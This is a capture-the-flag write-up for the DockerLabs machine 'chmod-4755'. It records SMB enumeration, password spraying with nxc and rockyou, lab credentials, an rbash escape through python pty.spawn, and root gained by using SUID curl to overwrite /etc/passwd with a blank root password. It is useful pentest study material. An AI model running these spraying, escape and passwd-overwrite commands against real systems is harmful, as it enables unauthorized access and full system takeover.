---
type: machine
platform: dockerlabs
difficulty: intermediate
ip: 172.17.0.2
cves: []
tools: [nmap, nxc, smbmap, smbclient, enum4linux, ssh, curl]
techniques: [information-gathering, smb-enumeration, hardcoded-credentials, restricted-shell-escape, suid-enumeration, writable-etc-passwd]
tags: [ejpt:assessment, ejpt:auditing, ejpt:host-net-pentest]
related: [[domain]], [[basic-pentesting]]
---

# chmod-4755

**Writeup:** [raw writeup](../../writeups/dockerlabs/intermediate/chmod-4755.md)

SMB-focused box whose *name* is the privesc hint: null-session enum → `smbuser` spray → share-name hint → SSH-banner username hint → second spray → `rbash` escape → SUID `curl` overwrites `/etc/passwd` → root.

## Path

1. **Recon** — `ping -c 2` (ttl=64) then `sudo nmap -p- --open --min-rate 5000 -T4 -n -Pn -sS -sCV` → `22/tcp` OpenSSH 9.6p1, `139/445/tcp` Samba smbd 4; NSE `smb2-security-mode` again shows **signing enabled but not required** ([[information-gathering]], [[nmap]]).
2. **SMB null session** — `smbmap -H TARGET` → `print$`, `share_secret_only`, `IPC$` all **NO ACCESS** ([[smbmap]]); `nxc smb TARGET --users` returns only **`smbuser`** — but `enum4linux | grep 'Local User'` walks the SAM RPC SIDs and also finds **`rabol`** (UID 1001) and `nobody` ([[smb-enumeration]], [[nxc]], [[enum4linux]]). **Tool divergence:** when enum tools disagree, the SID walk found the account that mattered.
3. **Spray** — `nxc smb TARGET -u smbuser -p rockyou.txt --ignore-pw-decoding` → valid **`smbuser:fuckit`** ([[nxc]]).
4. **Authenticated shares** — `smbmap -H -u smbuser -p fuckit` flips `print$` and `share_secret_only` from NO ACCESS to **READ ONLY**; `smbclient //TARGET/share_secret_only -U smbuser --password=fuckit` → `note.txt` (13 bytes): **"read better"** — and the share's *own name* is the next password ([[smbclient]], [[smb-enumeration]]). `print$` recursive sweep: all driver dirs empty (negative result).
5. **SSH username hint** — `ssh smbuser@TARGET` prints a pre-auth banner signed **"by fuckit"** — a *username*, not an insult ([[hardcoded-credentials]], [[ssh]]). Spray again: `nxc smb -u fuckit -p rockyou` → `fuckit:123456`, but SMB **accepts it as a guest-mapped ghost credential** — no SSH access, valid ≠ useful.
6. **Foothold** — the hint chain (banner name + share-name password) points at the unused `rabol` account: `ssh rabol@TARGET` with **`rabol:share_secret_only`** → lands in **`rbash`** (`sudo -l` → `-rbash: sudo: command not found`) ([[restricted-shell-escape]]).
7. **rbash escape** — `python3` → `import pty; pty.spawn("/bin/bash")`, then rebuild the path: `export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:$PATH` (without it, only `/home/rabol/bin` is on the path — even `whoami` fails) → `id` (groups `users`) → `user.txt` ([[restricted-shell-escape]]).
8. **Privesc** — `find / -perm -4000 2>/dev/null` → **`/usr/bin/curl`** (the box name: *chmod 4755*) → `sed 's/root:x:/root::/g' /etc/passwd > /tmp/passwd` + `curl file:///tmp/passwd -o /etc/passwd` (SUID write) → `root::0:0:…` → `su -` → **root** → `/root/root.txt` ([[suid-enumeration]], [[writable-etc-passwd]], [[curl]]).

## Credentials / secrets

| Item | Value |
|------|-------|
| `smbuser` (SMB) | `fuckit` (rockyou via nxc) |
| `fuckit` (SMB) | `123456` — guest-mapped, no SSH access |
| `rabol` (SSH) | `share_secret_only` (the share's name) |

## Takeaways

- **Run more than one enum tool.** `nxc --users` under-reported (1 account); `enum4linux`'s SID walk revealed `rabol` — the username the whole hint chain was pointing at ([[smb-enumeration]], [[enum4linux]]).
- **Everything is a hint.** The share name is a password, the SSH banner is a username, the note is an instruction ("read better"), and the box name is the privesc vector (`4755`).
- **An SMB-accepted password is not an SSH password.** `fuckit:123456` was a guest-mapped ghost credential — confirm a hit against the *service you intend to use* ([[nxc]]).
- **`rbash` is a speed bump, not a sandbox** — `python3` `pty.spawn` plus a rebuilt `PATH` is the standard exit, and you need both ([[restricted-shell-escape]]).
- **SUID `curl` is arbitrary root file write** — `file://` reads, `-o` writes as root; any SUID binary that writes where *you* say is the same primitive ([[suid-enumeration]], [[writable-etc-passwd]]).
